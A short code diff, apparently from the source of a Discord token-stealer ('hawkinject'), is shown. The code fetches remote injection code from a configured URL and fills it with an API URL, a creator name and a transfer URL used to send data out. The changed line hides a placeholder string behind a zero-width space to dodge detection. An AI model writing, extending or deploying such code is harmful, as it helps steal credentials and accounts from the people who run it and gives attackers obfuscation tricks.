@@ -1414,7 +1414,7 @@ class hwkish_first_funct(Functions):
                         core_asar = self.find_in_config("url_hawkinject")
                         try:
                             f = httpx.get(core_asar).text
-                            if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
+                            if self.apilink != "%\u200BAPI_LINK%" and self.apilink != "" and self.apilink != " ":
                                 f = f.replace("%API_URL%", self.apilink)
                                 f = f.replace("%NAME_CREATOR%", self.str_creator_)
                                 f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
